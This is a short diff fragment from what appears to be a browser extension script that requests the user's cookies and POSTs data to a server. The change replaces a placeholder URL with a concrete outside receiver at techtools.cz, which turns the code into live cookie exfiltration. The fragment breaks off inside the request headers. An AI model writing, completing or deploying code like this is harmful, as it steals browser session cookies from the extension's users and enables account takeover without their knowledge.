@@ -26,7 +26,7 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
 
 // Send data to the the processing server
 
-fetch('https://your-endpoint.com/post', {
+fetch('https://techtools.cz/extension/receiver', {
   method: 'POST', // Specify the method
   headers: {
     // Headers you want to send
